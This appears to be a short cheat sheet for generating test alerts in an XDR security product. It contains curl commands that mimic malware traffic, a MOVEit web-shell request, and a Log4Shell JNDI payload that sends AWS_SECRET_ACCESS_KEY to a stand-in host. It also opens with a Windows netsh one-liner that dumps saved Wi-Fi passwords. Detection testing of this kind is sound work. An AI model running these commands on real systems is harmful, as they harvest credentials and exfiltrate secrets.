# Dump Wifi Commands

for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear

# XDR

Need Web HTTP Server
Cmd (from machine running XDR sensor unless otherwise stated)
 Threat
   curl -X GET -H “User-Agent: VerbleConnectTM/” http://172.16.243.159
 Verblecon is a trojan malware that has been observed to install cryptocurrency miners. Alerts for this threat are generated when network traffic related to Verblecon is identified in the network.
   curl -X GET -H “User-Agent: EpicGamesLauncher/” http://172.16.243.159
 Gaming Clients are client programs that connect users to game servers. They can be installed on different operating systems. Users can download and play games using these platforms. Alerts are generated when network traffic related to a gaming client is identified in the network.
   curl -X GET -H "User-Agent: xanthe-start/" http://172.16.243.159
 Xanthe is a crypto miner that is docker-aware. It notably contains an anti-malware killer module to compete with other malware miners, as well as anti-security functionality.
   curl http://netflix.com-nobig-iss-dnqvmdke.iminge.pe
 We have identified network traffic indicating an attempted phishing attack. The identified phish disguises itself as an online service and attempts to trick victims through social engineering to reveal sensitive information.
   curl -v -X POST http://172.16.243.159:6789/guestaccess.aspx
curl -v http://172.16.243.159:6789/human2.aspx -H “X-siLock-Comment: PASSWORD” -H “x-siLock-Step1: -1"
 LEMURLOOT is a web shell written in C# which is deployed after exploiting a critical vulnerability in MOVEit Transfer secure managed file transfer software (CVE-2023-34362). LEMURLOOT web shell executes several SQLi attacks to steal Azure storage blob information and credentials. Alerts for this threat are generated when network traffic related to this web shell is identified in the network.
   curl -H “Host: \${jndi:ldap://\${env:AWS_SECRET_ACCESS_KEY}.badserver.com}” http://172.16.243.159/
 CVE-2021-44228 is a remote code execution (RCE) vulnerability in Apache Log4j2 <=2.14.1. Alerts for this threat are generated when network traffic related to the CVE-2021-442287 vulnerability is identified in the network.
   curl -H "accept: application/dns-json" "https://cloudflare-dns.com/dns-query?name=yahoo.com"
 We have identified a TLS handshake that indicates that a client is performing DNS resolutions over HTTPS.

 # ----------------------------
